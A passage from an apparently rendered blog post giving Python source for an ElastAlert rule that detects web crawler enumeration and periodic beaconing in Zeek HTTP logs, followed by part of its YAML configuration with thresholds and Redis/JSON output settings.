html</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, JoinableQueue, Lock, Manager</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> elastalert.ruletypes <span class="keyword">import</span> RuleType</span><br><span class="line"><span class="keyword">from</span> elastalert.util <span class="keyword">import</span> elastalert_logger</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please make sure you have pandas installed. pip install pandas&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please make sure you have tqdm module installed. pip install tqdm&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">host=<span class="string">&#x27;localhost&#x27;</span>, port=<span class="number">6379</span>, password=<span class="literal">None</span>, db=<span class="number">0</span></span>):</span></span><br><span class="line">    pool = redis.ConnectionPool(host=host, port=port, password=password, db=db)</span><br><span class="line">    conn = redis.Redis(connection_pool=pool)</span><br><span class="line">    <span class="keyword">return</span> conn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">put_data</span>(<span class="params">conn, q, data</span>):</span></span><br><span class="line">    <span class="keyword">with</span> conn.pipeline() <span class="keyword">as</span> pipe:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">            pipe.lpush(q, i)</span><br><span class="line">        pipe.execute()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SpiderRule</span>(<span class="params">RuleType</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, rules, args=<span class="literal">None</span></span>):</span></span><br><span class="line">        <span class="built_in">super</span>(SpiderRule, self).__init__(rules, args=<span class="literal">None</span>)</span><br><span class="line">        self.MAX_ARGS_LENGTH = <span class="built_in">int</span>(self.rules[<span class="string">&#x27;beacon&#x27;</span>][<span class="string">&#x27;max_args_length&#x27;</span>])</span><br><span class="line">        self.MIN_HITS = <span class="built_in">int</span>(self.rules[<span class="string">&#x27;beacon&#x27;</span>][<span class="string">&#x27;min_hits&#x27;</span>])</span><br><span class="line">        self.MAX_UNIQUE_ARGS = <span class="built_in">int</span>(self.rules[<span class="string">&#x27;beacon&#x27;</span>][<span class="string">&#x27;max_unique_args&#x27;</span>])</span><br><span class="line">        self.THRESHOLD_PERCENT = <span class="built_in">int</span>(self.rules[<span class="string">&#x27;beacon&#x27;</span>][<span class="string">&#x27;threshold_percent&#x27;</span>])</span><br><span class="line">        self.NUM_PROCESSES = <span class="built_in">int</span>(self.rules[<span class="string">&#x27;beacon&#x27;</span>][<span class="string">&#x27;threads&#x27;</span>])</span><br><span class="line">        self.UA_PROCESSES = <span class="built_in">int</span>(self.rules[<span class="string">&#x27;beacon&#x27;</span>][<span class="string">&#x27;user_agent&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        self.TIMESTAMP = <span class="string">&#x27;@timestamp&#x27;</span></span><br><span class="line">        self.FORMAT_TIMESTAMP = self.rules[<span class="string">&#x27;timestamp&#x27;</span>].get(<span class="string">&#x27;format&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">        self.beacon_module = self.rules[<span class="string">&#x27;beacon&#x27;</span>][<span class="string">&#x27;beacon_module&#x27;</span>]</span><br><span class="line">        self.WINDOW = <span class="built_in">int</span>(self.rules[<span class="string">&#x27;beacon&#x27;</span>][<span class="string">&#x27;window&#x27;</span>])</span><br><span class="line">        self.MIN_INTERVAL = <span class="built_in">int</span>(self.rules[<span class="string">&#x27;beacon&#x27;</span>][<span class="string">&#x27;min_interval&#x27;</span>])</span><br><span class="line">        buffer_time = <span class="built_in">str</span>(self.rules[<span class="string">&#x27;buffer_time&#x27;</span>])</span><br><span class="line">        self.PERIOD = <span class="string">&#x27;:&#x27;</span>.join(buffer_time.split(<span class="string">&#x27;:&#x27;</span>)[:<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">        self.fields = self.normalized_field(self.rules[<span class="string">&#x27;field&#x27;</span>])</span><br><span class="line">        self.src_ip = self.fields[<span class="string">&#x27;aliases&#x27;</span>][<span class="string">&#x27;src_ip&#x27;</span>]</span><br><span class="line">        self.url = self.fields[<span class="string">&#x27;aliases&#x27;</span>][<span class="string">&#x27;url&#x27;</span>]</span><br><span class="line">        self.url_path = self.fields[<span class="string">&#x27;aliases&#x27;</span>][<span class="string">&#x27;url_path&#x27;</span>]</span><br><span class="line">        self.http_host = self.fields[<span class="string">&#x27;aliases&#x27;</span>][<span class="string">&#x27;http_host&#x27;</span>]</span><br><span class="line">        self.user_agent = self.fields[<span class="string">&#x27;aliases&#x27;</span>][<span class="string">&#x27;user_agent&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        self.json = self.rules[<span class="string">&#x27;output&#x27;</span>][<span class="string">&#x27;json&#x27;</span>].get(<span class="string">&#x27;enable&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        self.redis = self.rules[<span class="string">&#x27;output&#x27;</span>][<span class="string">&#x27;redis&#x27;</span>].get(<span class="string">&#x27;enable&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">        self.q_job = JoinableQueue()</span><br><span class="line">        self.l_df = Lock()</span><br><span class="line">        self.l_list = Lock()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">normalized_field</span>(<span class="params">self, d</span>):</span></span><br><span class="line">        fields = &#123;<span class="string">&#x27;hash&#x27;</span>: [], <span class="string">&#x27;output&#x27;</span>: [], <span class="string">&#x27;aliases&#x27;</span>: &#123;&#125;&#125;</span><br><span class="line">        <span class="keyword">for</span> field, info <span class="keyword">in</span> d.items():</span><br><span class="line">            alias = info[<span class="string">&#x27;alias&#x27;</span>]</span><br><span class="line">            fields[<span class="string">&#x27;aliases&#x27;</span>][alias] = field</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> info.get(<span class="string">&#x27;type&#x27;</span>, []):</span><br><span class="line">                fields[i].append(field)</span><br><span class="line">        <span class="keyword">return</span> fields</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_data</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        <span class="comment"># Detection of spider crawlers</span></span><br><span class="line">        self.df = pd.json_normalize(data)</span><br><span class="line">        results = self.find_spiders()</span><br><span class="line"></span><br><span class="line">        d = results.to_dict(orient=<span class="string">&quot;records&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Output to local files</span></span><br><span class="line">        <span class="keyword">if</span> self.json:</span><br><span class="line">            json_path = self.rules[<span class="string">&#x27;output&#x27;</span>][<span class="string">&#x27;json&#x27;</span>][<span class="string">&#x27;path&#x27;</span>]</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(json_path, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> out_file:</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> d:</span><br><span class="line">                    out_file.write(json.dumps(i) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Output to Redis Server</span></span><br><span class="line">        <span class="keyword">if</span> self.redis:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                host = self.rules[<span class="string">&#x27;output&#x27;</span>][<span class="string">&#x27;redis&#x27;</span>][<span class="string">&#x27;host&#x27;</span>]</span><br><span class="line">                port = self.rules[<span class="string">&#x27;output&#x27;</span>][<span class="string">&#x27;redis&#x27;</span>][<span class="string">&#x27;port&#x27;</span>]</span><br><span class="line">                password = self.rules[<span class="string">&#x27;output&#x27;</span>][<span class="string">&#x27;redis&#x27;</span>][<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">                db = self.rules[<span class="string">&#x27;output&#x27;</span>][<span class="string">&#x27;redis&#x27;</span>][<span class="string">&#x27;db&#x27;</span>]</span><br><span class="line">                key = self.rules[<span class="string">&#x27;output&#x27;</span>][<span class="string">&#x27;redis&#x27;</span>][<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">                ioc = self.rules[<span class="string">&#x27;output&#x27;</span>][<span class="string">&#x27;redis&#x27;</span>][<span class="string">&#x27;field&#x27;</span>]</span><br><span class="line"></span><br><span class="line">                redis_conn = conn(host=host, port=port,</span><br><span class="line">                                  password=password, db=db)</span><br><span class="line">                IoC = results[ioc].unique().tolist()</span><br><span class="line">                put_data(redis_conn, key, IoC)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                elastalert_logger.error(<span class="string">&quot;Output Redis configuration errors.&quot;</span>)</span><br><span class="line">        self.add_match(d)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># The results of get_match_str will appear in the alert text</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_match_str</span>(<span class="params">self, match</span>):</span></span><br><span class="line">        <span class="keyword">return</span> json.dumps(match)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_match</span>(<span class="params">self, results</span>):</span></span><br><span class="line">        <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">            <span class="built_in">super</span>(SpiderRule, self).add_match(result)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_args_hash</span>(<span class="params">self, args, session_id</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hash</span>(<span class="built_in">tuple</span>(args + [session_id]))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_query_str</span>(<span class="params">self, request</span>):</span></span><br><span class="line">        query = request.split(<span class="string">&#x27;?&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">        query_str = <span class="built_in">dict</span>([i.split(<span class="string">&quot;=&quot;</span>, <span class="number">1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> query.split(</span><br><span class="line">            <span class="string">&quot;&amp;&quot;</span>) <span class="keyword">if</span> i <span class="keyword">if</span> <span class="built_in">len</span>(i.split(<span class="string">&quot;=&quot;</span>, <span class="number">1</span>)) == <span class="number">2</span>])</span><br><span class="line">        query_str[<span class="string">&#x27;args_list&#x27;</span>] = <span class="built_in">list</span>(query_str.keys())</span><br><span class="line">        query_str[<span class="string">&#x27;max_length&#x27;</span>] = <span class="built_in">len</span>(query_str)</span><br><span class="line">        query_str[<span class="string">&#x27;url_sample&#x27;</span>] = request</span><br><span class="line">        <span class="keyword">return</span> query_str</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">percent_grouping</span>(<span class="params">self, d, total</span>):</span></span><br><span class="line">        interval = <span class="number">0</span></span><br><span class="line">        <span class="comment"># Finding the key with the largest value (interval with most events)</span></span><br><span class="line">        mx_key = <span class="built_in">int</span>(<span class="built_in">max</span>(<span class="built_in">iter</span>(<span class="built_in">list</span>(d.keys())), key=(<span class="keyword">lambda</span> key: d[key])))</span><br><span class="line">        mx_percent = <span class="number">0.0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(mx_key - self.WINDOW, mx_key + <span class="number">1</span>):</span><br><span class="line">            current = <span class="number">0</span></span><br><span class="line">            <span class="comment"># Finding center of current window</span></span><br><span class="line">            curr_interval = i + <span class="built_in">int</span>(self.WINDOW / <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i, i + self.WINDOW):</span><br><span class="line">                <span class="keyword">if</span> j <span class="keyword">in</span> d:</span><br><span class="line">                    current += d[j]</span><br><span class="line"></span><br><span class="line">            percent = <span class="built_in">float</span>(current) / total * <span class="number">100</span></span><br><span class="line">            <span class="keyword">if</span> percent &gt; mx_percent:</span><br><span class="line">                mx_percent = percent</span><br><span class="line">                interval = curr_interval</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> interval, mx_percent</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_beacon</span>(<span class="params">self, session_data</span>):</span></span><br><span class="line">        beacon = &#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.FORMAT_TIMESTAMP:</span><br><span class="line">            session_data[self.TIMESTAMP] = pd.to_datetime(</span><br><span class="line">                session_data[self.TIMESTAMP])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session_data[self.TIMESTAMP] = pd.to_datetime(</span><br><span class="line">                session_data[self.TIMESTAMP], <span class="built_in">format</span>=self.FORMAT_TIMESTAMP)</span><br><span class="line">        session_data[self.TIMESTAMP] = (</span><br><span class="line">            session_data[self.TIMESTAMP].astype(<span class="built_in">int</span>) / <span class="number">1000000000</span>).astype(<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">        session_data = session_data.sort_values([self.TIMESTAMP])</span><br><span class="line">        session_data[<span class="string">&#x27;delta&#x27;</span>] = (</span><br><span class="line">            session_data[self.TIMESTAMP] - session_data[self.TIMESTAMP].shift()).fillna(<span class="number">0</span>)</span><br><span class="line">        session_data = session_data[<span class="number">1</span>:]</span><br><span class="line">        d = <span class="built_in">dict</span>(session_data.delta.value_counts())</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">list</span>(d.keys()):</span><br><span class="line">            <span class="keyword">if</span> key &lt; self.MIN_INTERVAL:</span><br><span class="line">                <span class="keyword">del</span> d[key]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Finding the total number of events</span></span><br><span class="line">        total = <span class="built_in">sum</span>(d.values())</span><br><span class="line">        <span class="keyword">if</span> d <span class="keyword">and</span> total &gt; self.MIN_HITS:</span><br><span class="line">            window, percent = self.percent_grouping(d, total)</span><br><span class="line">            <span class="keyword">if</span> percent &gt; self.THRESHOLD_PERCENT <span class="keyword">and</span> total &gt; self.MIN_HITS:</span><br><span class="line">                beacon = &#123;</span><br><span class="line">                    <span class="string">&#x27;percent&#x27;</span>: <span class="built_in">int</span>(percent),</span><br><span class="line">                    <span class="string">&#x27;interval&#x27;</span>: <span class="built_in">int</span>(window),</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> beacon</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_spider</span>(<span class="params">self, q_job, spider_list</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> q_job.empty():</span><br><span class="line">            session_id = q_job.get()</span><br><span class="line">            self.l_df.acquire()</span><br><span class="line">            session_data = self.df[self.df[<span class="string">&#x27;session_id&#x27;</span>]</span><br><span class="line">                                   == session_id]</span><br><span class="line">            self.l_df.release()</span><br><span class="line"></span><br><span class="line">            query_str = session_data[self.url].apply(</span><br><span class="line">                <span class="keyword">lambda</span> req: self.get_query_str(req)).tolist()</span><br><span class="line">            query_data = pd.DataFrame(query_str)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># get args_hash</span></span><br><span class="line">            query_data[<span class="string">&#x27;args_hash&#x27;</span>] = query_data[<span class="string">&#x27;args_list&#x27;</span>].apply(</span><br><span class="line">                <span class="keyword">lambda</span> args: self.get_args_hash(args, session_id))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> query_data[<span class="string">&#x27;args_hash&#x27;</span>].unique():</span><br><span class="line">                result = &#123;</span><br><span class="line">                    <span class="string">&quot;detail&quot;</span>: &#123;</span><br><span class="line">                        <span class="string">&#x27;percent&#x27;</span>: &#123;&#125;,</span><br><span class="line">                        <span class="string">&#x27;unique&#x27;</span>: &#123;&#125;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">&quot;tags&quot;</span>: [],</span><br><span class="line">                    <span class="string">&quot;src_ip&quot;</span>: session_data[self.src_ip].tolist()[<span class="number">0</span>],</span><br><span class="line">                    <span class="string">&quot;url_path&quot;</span>: session_data[self.url_path].tolist()[<span class="number">0</span>],</span><br><span class="line">                    <span class="string">&quot;http_host&quot;</span>: session_data[self.http_host].tolist()[<span class="number">0</span>],</span><br><span class="line">                    <span class="string">&quot;unique_ua&quot;</span>: session_data[self.user_agent].unique().shape[<span class="number">0</span>],</span><br><span class="line">                    <span class="string">&quot;alert&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                df = query_data[query_data[<span class="string">&#x27;args_hash&#x27;</span>] == i]</span><br><span class="line">                count_args_length = df[<span class="string">&#x27;max_length&#x27;</span>].iloc[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">if</span> count_args_length &gt; self.MAX_ARGS_LENGTH:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                total_hits = df.shape[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">if</span> total_hits &lt; self.MIN_HITS:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                args_list = df[<span class="string">&#x27;args_list&#x27;</span>].iloc[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> args_list:</span><br><span class="line">                    unique_args = <span class="built_in">len</span>(df[i].unique())</span><br><span class="line">                    <span class="keyword">if</span> unique_args == <span class="number">1</span>:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment"># Calculate the percentage based on the number of changes in the parameters</span></span><br><span class="line">                    current_percent = <span class="built_in">int</span>((unique_args / total_hits) * <span class="number">100</span>)</span><br><span class="line">                    <span class="keyword">if</span> current_percent &lt; self.THRESHOLD_PERCENT:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                    result[<span class="string">&#x27;detail&#x27;</span>][<span class="string">&#x27;percent&#x27;</span>][i] = current_percent</span><br><span class="line">                    result[<span class="string">&#x27;detail&#x27;</span>][<span class="string">&#x27;unique&#x27;</span>][i] = unique_args</span><br><span class="line"></span><br><span class="line">                    <span class="comment"># Number of parameters with changes</span></span><br><span class="line">                    count_unique_args = <span class="built_in">len</span>(result[<span class="string">&#x27;detail&#x27;</span>][<span class="string">&#x27;unique&#x27;</span>])</span><br><span class="line">                    <span class="keyword">if</span> count_unique_args &lt;= self.MAX_UNIQUE_ARGS:</span><br><span class="line">                        result[<span class="string">&#x27;alert&#x27;</span>] = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> result[<span class="string">&#x27;detail&#x27;</span>][<span class="string">&#x27;unique&#x27;</span>]:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># Beacon analysis</span></span><br><span class="line">                <span class="keyword">if</span> self.beacon_module:</span><br><span class="line">                    result[<span class="string">&#x27;beacon&#x27;</span>] = self.find_beacon(</span><br><span class="line">                        session_data.reset_index(drop=<span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line">                result[<span class="string">&#x27;args_list&#x27;</span>] = args_list</span><br><span class="line">                result[<span class="string">&#x27;total_hits&#x27;</span>] = total_hits</span><br><span class="line">                result[<span class="string">&#x27;url_sample&#x27;</span>] = df[<span class="string">&#x27;url_sample&#x27;</span>].iloc[<span class="number">0</span>]</span><br><span class="line">                result[<span class="string">&#x27;period&#x27;</span>] = self.PERIOD</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> result[<span class="string">&#x27;alert&#x27;</span>]:</span><br><span class="line">                    result[<span class="string">&#x27;tags&#x27;</span>].append(<span class="string">&#x27;enumerate&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> result[<span class="string">&#x27;beacon&#x27;</span>]:</span><br><span class="line">                    result[<span class="string">&#x27;tags&#x27;</span>].append(<span class="string">&#x27;beacon&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> result[<span class="string">&#x27;unique_ua&#x27;</span>] &gt;= self.UA_PROCESSES:</span><br><span class="line">                    result[<span class="string">&#x27;tags&#x27;</span>].append(<span class="string">&#x27;suspicious-ua&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                self.l_list.acquire()</span><br><span class="line">                spider_list.append(result)</span><br><span class="line">                self.l_list.release()</span><br><span class="line">            q_job.task_done()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_spiders</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.df.empty:</span><br><span class="line">            <span class="keyword">raise</span> Exception(</span><br><span class="line">                <span class="string">&quot;Elasticsearch did not retrieve any data. Please ensure your settings are correct inside the config file.&quot;</span>)</span><br><span class="line"></span><br><span class="line">        tqdm.pandas(desc=<span class="string">&quot;Detection of Spider Crawlers.&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># get url_path</span></span><br><span class="line">        self.df[self.url_path] = self.df[self.url].<span class="built_in">str</span>.split(<span class="string">&#x27;?&#x27;</span>).<span class="built_in">str</span>.get(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># add session_id from hash fields</span></span><br><span class="line">        self.df[<span class="string">&#x27;session_id&#x27;</span>] = self.df[self.fields[<span class="string">&#x27;hash&#x27;</span>]</span><br><span class="line">                                        ].progress_apply(<span class="keyword">lambda</span> row: <span class="built_in">hash</span>(<span class="built_in">tuple</span>(row)), axis=<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># split url</span></span><br><span class="line">        self.df = self.df[self.df[self.url].apply(<span class="keyword">lambda</span> request: <span class="literal">True</span> <span class="keyword">if</span> <span class="built_in">len</span>(</span><br><span class="line">            request.split(<span class="string">&#x27;?&#x27;</span>)) == <span class="number">2</span> <span class="keyword">else</span> <span class="literal">False</span>)].reset_index(drop=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># normalized url</span></span><br><span class="line">        self.df[self.url] = self.df[self.url].apply(</span><br><span class="line">            <span class="keyword">lambda</span> request: html.unescape(request))</span><br><span class="line">        <span class="comment"># unique session_id</span></span><br><span class="line">        unique_session = self.df[<span class="string">&#x27;session_id&#x27;</span>].unique()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> session <span class="keyword">in</span> unique_session:</span><br><span class="line">            self.q_job.put(session)</span><br><span class="line"></span><br><span class="line">        mgr = Manager()</span><br><span class="line">        spider_list = mgr.<span class="built_in">list</span>()</span><br><span class="line">        processes = [Process(target=self.find_spider, args=(</span><br><span class="line">            self.q_job, spider_list,)) <span class="keyword">for</span> thread <span class="keyword">in</span> <span class="built_in">range</span>(self.NUM_PROCESSES)]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Run processes</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">            p.start()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Exit the completed processes</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">            p.join()</span><br><span class="line"></span><br><span class="line">        results = pd.DataFrame(<span class="built_in">list</span>(spider_list))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># add timestamp</span></span><br><span class="line">        now = datetime.datetime.now().isoformat()</span><br><span class="line">        results[<span class="string">&#x27;timestamp&#x27;</span>] = now</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> results.empty:</span><br><span class="line">            results = results[results[<span class="string">&#x27;alert&#x27;</span>] == <span class="literal">True</span>]</span><br><span class="line"></span><br><span class="line">        match_log = <span class="string">&quot;Queried rule %s matches %s crawl events&quot;</span> % (</span><br><span class="line">            self.rules[<span class="string">&#x27;name&#x27;</span>],</span><br><span class="line">            results.shape[<span class="number">0</span>]</span><br><span class="line">        )</span><br><span class="line">        elastalert_logger.info(match_log)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> results</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="é…ç½®æ–‡ä»¶"><a href="#é…ç½®æ–‡ä»¶" class="headerlink" title="é…ç½®æ–‡ä»¶"></a>é…ç½®æ–‡ä»¶</h5><ul>
<li><h6 id="Web-yaml"><a href="#Web-yaml" class="headerlink" title="Web.yaml"></a>Web.yaml</h6></li>
</ul>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">&quot;Detection of Spider Crawlers&quot;</span></span><br><span class="line"><span class="attr">es_host:</span> <span class="string">&quot;es_server&quot;</span></span><br><span class="line"><span class="attr">es_port:</span> <span class="number">9200</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;elastalert_modules.spider.my_rules.SpiderRule&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">index:</span> <span class="string">&quot;zeek-other-%Y.%m.%d&quot;</span></span><br><span class="line"><span class="attr">use_strftime_index:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">filter:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">term:</span></span><br><span class="line">    <span class="attr">host:</span> <span class="string">&quot;canon88.github.io&quot;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">term:</span></span><br><span class="line">    <span class="attr">method.keyword:</span> <span class="string">&quot;GET&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">include:</span> [<span class="string">&quot;true_client_ip&quot;</span>, <span class="string">&quot;host&quot;</span>, <span class="string">&quot;uri&quot;</span>, <span class="string">&quot;uri_path&quot;</span>, <span class="string">&quot;user_agent&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="attr">timestamp:</span></span><br><span class="line">  <span class="attr">format:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">timestamp_field:</span> <span class="string">&quot;@timestamp&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">buffer_time:</span></span><br><span class="line">  <span class="attr">hours:</span> <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="attr">run_every:</span></span><br><span class="line">  <span class="attr">minutes:</span> <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="attr">max_query_size:</span> <span class="number">10000</span></span><br><span class="line"><span class="attr">scroll:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">beacon:</span></span><br><span class="line">  <span class="attr">max_args_length:</span> <span class="number">10</span>		<span class="comment"># æœ€å¤§æ£€æµ‹å‚æ•°ä¸ªæ•°</span></span><br><span class="line">  <span class="attr">min_hits:</span> <span class="number">120</span>					<span class="comment"># æœ€å°å‘½ä¸­äº‹ä»¶æ•°</span></span><br><span class="line">  <span class="attr">max_unique_args:</span> <span class="number">2</span>		<span class="comment"># æœ€å¤§åŠ¨æ€å˜åŒ–å‚æ•°</span></span><br><span class="line">  <span class="attr">threshold_percent:</span> <span class="number">70</span>	<span class="comment"># è¯·æ±‚é˜ˆå€¼ç™¾åˆ†æ¯”</span></span><br><span class="line">  <span class="attr">threads:</span> <span class="number">16</span>						<span class="comment"># å¤šè¿›ç¨‹</span></span><br><span class="line">  <span class="attr">beacon_module:</span> <span class="literal">true</span>		<span class="comment"># å¼€å¯å‘¨æœŸæ€§æ£€æµ‹</span></span><br><span class="line">  <span class="attr">min_interval:</span> <span class="number">1</span>				<span class="comment"># æœ€å°å‘¨æœŸ</span></span><br><span class="line">  <span class="attr">window:</span> <span class="number">2</span>							<span class="comment"># æŠ–åŠ¨çª—å£</span></span><br><span class="line">  <span class="attr">user_agent:</span> <span class="number">20</span>				<span class="comment"># 